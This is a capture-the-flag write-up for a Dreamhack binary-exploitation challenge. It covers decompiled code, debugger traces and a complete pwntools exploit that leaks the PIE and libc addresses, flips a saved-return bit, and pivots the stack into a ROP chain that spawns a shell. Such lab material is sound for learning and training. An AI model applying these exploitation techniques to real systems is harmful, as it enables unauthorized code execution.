### I. check mitigation
```D
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
```
### II. IDA
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 option; // [rsp+8h] [rbp-8h]

  init(a1, a2, a3);
  puts(off_5020);
  menu();
  while ( 1 )
  {
    printf(">> ");
    option = (unsigned int)input();
    if ( (unsigned int)option != 1LL )
      break;
    bss_message();
  }
  if ( option == 2 )
    flip();
  else
    puts("invalid choice :/");
  return 0LL;
}
__int64 bss_message()
{
  puts("I will save your message to here");
  printf(":=  ");
  puts(aThisIsBssMessa);
  printf(">> ");
  return print_message(aThisIsBssMessa, 4096LL);
}

.data:0000000000004020 ; char aThisIsBssMessa[]
.data:0000000000004020 aThisIsBssMessa db 'This is bss message space.',0

_BYTE *__fastcall print_message(_BYTE *str, int size)
{
  int count; // [rsp+14h] [rbp-Ch]
  _BYTE *buf; // [rsp+18h] [rbp-8h]

  buf = str;
  count = 0;
  while ( 1 )
  {
    if ( !read(0, buf, 1uLL) )
      exit(1);
    if ( *buf == '\n' )
      break;
    ++buf;
    if ( ++count == size )
      return (_BYTE *)(buf - str);
  }
  *buf = 0;
  return (_BYTE *)(buf - str);
}
unsigned __int64 flip()
{
  char v1; // [rsp+8h] [rbp-28h] BYREF
  unsigned __int64 v2; // [rsp+10h] [rbp-20h]
  __int64 v3; // [rsp+18h] [rbp-18h]
  char *v4; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  v4 = &v1;
  printf("offset: ");
  v3 = (int)input();
  printf("bit index (7 ~ 0): ");
  v2 = (int)input();
  if ( v2 >= 8 )
  {
    puts("Stop kidding :p");
    exit(1);
  }
  v4 += v3;
  printf("before byte: %x\n", *v4);
  *v4 ^= 1 << v2;
  printf("after byte: %x\n", *v4);
  return v5 - __readfsqword(0x28u);
}
__int64 input(void)
{
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  if ( read(0, buf, 14uLL) < 0 )
  {
    fwrite("read error!\n", 1uLL, 0xCuLL, stderr);
    exit(1);
  }
  return atoll(buf);
}
```
### III. analyze
#### 1. debug
- `main()` has 2 opt: print message & fip
- message or `aThisIsBssMessa`, which is located on .bss, will be printed by `puts` 
```D
 0x555555555402    call   puts@plt                    <puts@plt>
        s: 0x555555558020 ◂— 'This is bss message space.'
        
pwndbg> vmmap 0x555555554000+0x4020
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
        Start                End        Perm     Size  Offset       File
      0x555555557000     0x555555558000 r--p     1000    2000 operator_patched
►     0x555555558000     0x55555555c000 rw-p     4000    3000 operator_patched +0x20
      0x7ffff7c00000     0x7ffff7c28000 r--p    28000       0 libc.so.6
pwndbg> x/s 0x555555554000+0x4020
0x555555558020: "This is bss message space."
```
- then it will ret2 `print_message()` that reads byte-by-byte from offset `0x4020` (overwrite `aThisIsBssMessa`) until either `\n` or size = 4096
```D
pwndbg> x/100xg 0x555555554000+0x4020
0x555555558020: 0x6161616161616161      0x6161616161616162
0x555555558030: 0x6161616161616163      0x6161616161616164
0x555555558040: 0x6161616161616165      0x6161616161616166
...
```
- choose opt 1 will create a loop
- and if choose opt 1 again, it will print new `aThisIsBssMessa`
- look at .bss, data from offset 0x4020 to 0x5020 (0x1000 bytes) is all `0x0`, except 0x5020: 
```D
pwndbg> vmmap 0x0000555555556008
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
      0x555555555000     0x555555556000 r-xp     1000    1000 operator_patched
►     0x555555556000     0x555555557000 r--p     1000    2000 operator_patched +0x8
      0x555555557000     0x555555558000 r--p     1000    2000 operator_patched
```
- so its able to leak PIE by sending 0x1000 byte and choosing opt 1 again
```D
[DEBUG] Received 0x48 bytes:
    b'Hi there! you just learned "BIT FLIP"!\n'
    b'1. give bss a message\n'
    b'2. flip\n'
    b'>> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x43 bytes:
    b'I will save your message to here\n'
    b':=  This is bss message space.\n'
    b'>> '
[DEBUG] Sent 0x1000 bytes:
    b'A' * 0x1000
[DEBUG] Received 0x3 bytes:
    b'>> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0xfff bytes:
    b'I will save your message to here\n'
    b':=  AAAAAAAAAAAA...A'
[DEBUG] Received 0x30 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 08 d0  63 77 3b 5d  0a 3e 3e 20  │AAAA│AA··│cw;]│·>> │
    00000030
[+] PIE leak: 0x5d3b7763d008
```
- and we will have some gadgets to use later!
- `flip()` allows us to XOR one bit of data on stack
```D
>> 2
offset: 8
bit index (7 ~ 0): 7

   0x5555555554cf    mov    rax, qword ptr [rbp - 0x18]     RAX, [0x7fffffffdae8] => 8
   0x5555555554d3    add    qword ptr [rbp - 0x10], rax     [0x7fffffffdaf0] <= 0x7fffffffdae0 (0x7fffffffdad8 + 0x8)
   0x5555555554d7    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7fffffffdaf0] => 0x7fffffffdae0 ◂— 7

before byte: 7
02:0010│-020 0x7fffffffdae0 ◂— 7
03:0018│-018 0x7fffffffdae8 ◂— 8
04:0020│-010 0x7fffffffdaf0 —▸ 0x7fffffffdae0 ◂— 7

   0x55555555550d    xor    edx, eax                        EDX => 0x87 (0x7 ^ 0x80)
   0x55555555550f    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7fffffffdaf0] => 0x7fffffffdae0 ◂— 7
   0x555555555513    mov    byte ptr [rax], dl              [0x7fffffffdae0] <= 0x87
 ► 0x555555555515    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7fffffffdaf0] => 0x7fffffffdae0 ◂— 0x87
 
after byte: ffffff87
04:0020│-010 0x7fffffffdaf0 —▸ 0x7fffffffdae0 ◂— 0x87
```
- and exit program
- but we still need to leak libc, so have to find a way to ret2main
- with one bit flipped only, the only way is to flip one of saved rip, LSB specifically
- after calculating all 8 cases (with the help of chatgpt :D), i found if change the 6th bit, it will ret into `while` in `main()`
```D
1100 0011 /0xc3
^0100 0000
=1000 0011 /0x83

*RDI  0x7fffa325e220 —▸ 0x7902c0e620d0 (funlockfile) ◂— endbr64
06:0030│ rbp 0x7fffa3260490 —▸ 0x7fffa32604b0 ◂— 1
07:0038│+008 0x7fffa3260498 —▸ 0x64e5f9b215c3 ◂— jmp 0x64e5f9b215d4
pwndbg> x/10i 0x64e5f9b21583
   0x64e5f9b21583:      mov    eax,0x0
   0x64e5f9b21588:      call   0x64e5f9b210e0 <printf@plt>
   0x64e5f9b2158d:      call   0x64e5f9b2130c
   0x64e5f9b21592:      mov    eax,eax
   0x64e5f9b21594:      mov    QWORD PTR [rbp-0x8],rax
   0x64e5f9b21598:      mov    rax,QWORD PTR [rbp-0x8]
===== ret to while in main =====
 while ( 1 )
  {
    printf(">> ");
    option = (unsigned int)input();
    if ( (unsigned int)option != 1LL )
      break;
    bss_message();
  }
```
- and bc `rdi` still holds a libc addr, `printf` will print it out and we successfully leaked libc addr
```D
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x3 bytes:
    b'>> '
[DEBUG] Received 0x8 bytes:
    b'offset: '
[DEBUG] Sent 0x3 bytes:
    b'48\n'
[DEBUG] Received 0x13 bytes:
    b'bit index (7 ~ 0): '
[DEBUG] Sent 0x2 bytes:
    b'6\n'
[DEBUG] Received 0x31 bytes:
    00000000  62 65 66 6f  72 65 20 62  79 74 65 3a  20 66 66 66  │befo│re b│yte:│ fff│
    00000010  66 66 66 63  33 0a 61 66  74 65 72 20  62 79 74 65  │fffc│3·af│ter │byte│
    00000020  3a 20 66 66  66 66 66 66  38 33 0a d0  20 66 f7 7d  │: ff│ffff│83··│ f·}│
    00000030  78                                                  │x│
    00000031
[+] libc leak: 0x787df76620d0
```
- now we add ROPchain on .bss to pivot, I use one gadget
- notice `atoll` in `input()`, it converts string to long long, but stops when encountering non-digit char
- it means we can insert a digit (0-7) plus a non-digit string as long as len<=14 and it stills overwrite current (and also next one at next addr) with non-digit string `*v4 ^= 1 << v2;`
```D
[DEBUG] Received 0x13 bytes:
    b'bit index (7 ~ 0): '
[DEBUG] Sent 0xe bytes:
    00000000  37 f0 63 77  3b 5d 00 00  d5 c5 63 77  3b 5d        │7·cw│;]··│··cw│;]│
[DEBUG] Received 0x16 bytes:
    b'before byte: fffffff0\n'
06:0030│ rbp 0x7ffee75accd0 —▸ 0x7ffee75accf0 ◂— 1
[DEBUG] Received 0xf bytes:
    b'after byte: 70\n'
06:0030│ rax rbp 0x7ffee75accd0 —▸ 0x7ffee75acc70 —▸ 0x5d3b7763f037

pwndbg> x/xg 0x7ffee75acc70
0x7ffee75acc70: 0x00005d3b7763f037
pwndbg> x/xg 0x7ffee75acc78
0x7ffee75acc78: 0x00005d3b7763c5d5
```
- the addr is random, it can have `'\x0a` ~ `\n` or a digit, which occurs `"Stop kidding :p"`, we need a `while` to try until it receives full payload 
- and bc it overwrites LBS with bit option (which is '7' in this case), we have to pad .bss so that ROPchain starts from offset 0xXX37
- if there is only one `leave ; ret` from `main()`, only `rbp` is .bss addr, but `rsp` not yet
```D
*RBP  0x5f698197b037 —▸ 0x5f698197801a ◂— ret
*RSP  0x7ffc1dfafc58 —▸ 0x7ffc1dfafde8 —▸ 0x7ffc1dfb1f22 ◂— '/home/mduong/ctf/dreamhack/operator/deploy/operator_patched'
*RIP  0x5f69819785db ◂— ret

   0x5f698197854a    leave
   0x5f698197854b    ret                                <0x5f69819785c3>
    ↓
   0x5f69819785c3    jmp    0x5f69819785d4              <0x5f69819785d4>
    ↓
   0x5f69819785d4    nop
   0x5f69819785d5    mov    eax, 0     EAX => 0
   0x5f69819785da    leave
 ► 0x5f69819785db    ret                                <0x7ffc1dfafde8>
```
-  so after jumping back to `main()`, add next instruction as `leave ; ret`
```python
b'7' + p64(fake_rbp)[1:] + p64(leave_ret)[:6]
```
- trying to jump into one gadget directly after pivot will cause error, since `execve` will use a large amount of space before ROPchain, which is `r--p` only -> move saved rbp to a larger space
```python
payload += p64(pop_rbp) + p64(pie_base + 0x6000) + p64(ret) + p64(one_gadget)
```

-> overall, since we can only overwrite .bss and change (flip) one bit on stack, the path will be:
  **leak PIE via opt 1 ->  overwriting saved rip via opt 2 -> ret2main -> leak libc -> add ROPchain on .bss -> stack pivot to ROPchain**
#### 2. PoC
```python
#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'operator_patched'
HOST = 'host8.dreamhack.games'
PORT = 18214

exe = ELF(exe_path, checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x13df
brva 0x1432
brva 0x142a
continue
c 4
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)

# ============================EXPLOIT============================

# leak PIE 
sla(b'>> ', b'1')
sa(b'>> ', b'A' * 0x1000)
sla(b'>> ', b'1')
p.recvuntil(b'A' * 0x1000)
pie_leak = u64(p.recv(6).ljust(8, b'\x00'))
pie_base = pie_leak - 0x2008
log.success(f'PIE leak: {hex(pie_leak)}')
log.success(f'PIE base: {hex(pie_base)}')

# gadgets
leave_ret = 0x15d5 + pie_base # avoid 0x0a (leave ; ret : 0x130a) -> mov eax, 0x0; leave; ret
ret = 0x101a + pie_base
pop_rbp = 0x1213 + pie_base
add_ptr_rsp = 0x1212 + pie_base #  add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret

# refill opt 1
s(cyclic(0x1000))

# leak libc
sla(b'>> ', b'2')
sla(b'offset: ', b'48')
sla(b'bit index (7 ~ 0): ', b'6')
p.recvuntil(b'ffffff83' + b'\n')
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - 0x620d0
log.success(f'libc leak: {hex(libc_leak)}')
log.success(f'libc base: {hex(libc.address)}')

# ROP chain
sl(b'1')
one_gadget = libc.address + 0xebcf5
payload = b'B' * 0x17 + p64(ret)
payload += p64(pop_rbp) + p64(pie_base + 0x6000) + p64(ret) + p64(one_gadget)

sla(b'>> ', payload)

fake_rbp = pie_base + 0x4020
sla(b'>> ', b'2')
sla(b'offset: ', b'40')
sa(b'bit index (7 ~ 0): ', b'7' + p64(fake_rbp)[1:] + p64(leave_ret)[:6]) # leave ret to pivot rsp

# get flag
sl(b'cat flag*')
p.interactive()
```